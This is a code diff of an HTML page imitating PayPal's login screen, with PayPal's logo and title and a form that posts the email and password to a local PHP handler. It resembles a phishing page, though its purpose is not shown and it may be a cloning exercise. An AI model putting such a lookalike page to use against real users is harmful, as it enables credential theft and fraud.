@@ -3,84 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PayPal Login</title>
+    <title>Login to your PayPal account</title>
     <link rel="stylesheet" href="../css/paypal_login.css">
+    <link rel="icon" type="image/jpeg" href="../logo/paypal-3384015_1280.png">
 </head>
 <body>
-    <div class="page-wrapper">
-        <!-- Main Container -->
-        <div class="login-page">
-
-            <!-- Login Section -->
-            <div class="login-section">
-                <form id="loginForm" class="login-form">
-                    <!-- Logo -->
-                    <div class="paypal-logo">PayPal</div>
-                    <!-- Email Input -->
-                    <div class="form-field">
-                        <input 
-                            type="email"
-                            id="email"
-                            class="input-field"
-                            autocomplete="email"
-                            required
-                        >
-                        <label for="email" class="input-label">Email or mobile number</label>
-                        <span class="error-message" id="emailError"></span>
-                    </div>
-
-                    <!-- Password Input -->
-                    <div class="form-field">
-                        <input 
-                            type="password"
-                            id="password"
-                            class="input-field"
-                            autocomplete="current-password"
-                            required
-                        >
-                        <label for="password" class="input-label">Password</label>
-                        <span class="error-message" id="passwordError"></span>
-                    </div>
-
-                    <!-- Forgot Password Link -->
-                    <a href="#" class="forgot-password">Forgot your password?</a>
-
-                    <!-- Login Button -->
-                    <button type="submit" class="btn-login">Log In</button>
-
-                    <!-- Sign Up Section -->
-                    <div class="signup-section">
-                        <p class="signup-text">Don't have an account? <a href="paypal_signup.php" class="signup-link">Sign Up</a></p>
-                    </div>
-                </form>
+    <div class="form">
+        <img src="../logo/Paypal-Logo.png" alt="PayPal Logo" class="logo">
+        <form action="process_login.php" method="post">
+            <div class="input-container">
+                <input type="email" id="email" name="email" required>
+                <label for="email">Email or mobile number <span class="required"></span></label>
             </div>
+            <div class="input-container">
+                <input type="password" id="password" name="password" required>
+                <label for="password">Enter your password <span class="required"></span></label>
+            </div>
+            <div class="forgot-password"><b>Forgot password?</b></div>
+            <button type="submit" class="btn-login">Log In</button>
+            <div class="divider">or</div>
+            <button type="button" class="btn-signup">Sign Up</button>
+        </form>
+        <div class="language-selector">
+            <select id="country-flag" class="language-dropdown">
+                <option value="">🌍</option>
+            </select>
+            <span class="language-label">Select Country</span>
         </div>
-
-        <!-- Footer -->
-        <footer class="footer">
-            <div class="footer-content">
-                <a href="#" class="footer-link">Contact Us</a>
-                <a href="#" class="footer-link">Privacy</a>
-                <a href="#" class="footer-link">Legal</a>
-                <a href="#" class="footer-link">Policy Updates</a>
-                <a href="#" class="footer-link">Worldwide</a>
-            </div>
-            <div class="language-selector">
-                <button class="language-toggle" id="languageToggle">
-                    <span class="flag">🇺🇸</span>
-                    <span class="lang-text">English</span>
-                    <span class="dropdown-icon">▼</span>
-                </button>
-                <div class="language-menu" id="languageMenu">
-                    <a href="#" class="lang-option">English</a>
-                    <a href="#" class="lang-option">Français</a>
-                    <a href="#" class="lang-option">Español</a>
-                    <a href="#" class="lang-option">中文</a>
-                </div>
-            </div>
-        </footer>
     </div>
-
+    <footer class="footer">
+        <div class="footer-container">
+            <a href="#" class="footer-link">Contact Us</a>
+            <a href="#" class="footer-link">Privacy</a>
+            <a href="#" class="footer-link">Legal</a>
+            <a href="#" class="footer-link">Policy Updates</a>
+            <a href="#" class="footer-link">Worldwide</a>
+        </div>
+    </footer>
     <script src="../javascript/paypal_login.js"></script>
 </body>
 </html>
